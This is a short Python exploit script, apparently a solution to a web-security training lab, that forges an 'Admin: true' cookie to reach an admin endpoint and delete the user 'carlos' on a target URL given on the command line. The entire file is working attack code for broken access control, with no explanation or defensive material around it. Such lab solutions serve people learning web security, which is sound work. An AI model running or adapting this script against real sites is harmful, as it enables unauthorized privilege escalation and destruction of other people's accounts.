import requests
import sys

def delete_user(url):

    delete_user = url + "/admin/delete?username=carlos"
    cookie = {"Admin": "true"}

    print("(+) Deleting user Carlos...")
    response = requests.get(delete_user, cookies=cookie)
    
    if response.status_code == 200:
        print("(+) Deleted user Carlos Successfully.")
    else:
        print("(-) Something went wrong! Could not Delete user Carlos.")
        print("(-) Exiting...")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: python3 %s website" % sys.argv[0])
        print("(+) Example: python3 %s www.example.com" % sys.argv[0])
        sys.exit(1)
    
    else:
        print("(+) Starting the script...")
        url = sys.argv[1]
        delete_user(url)


if __name__ == "__main__":
    main()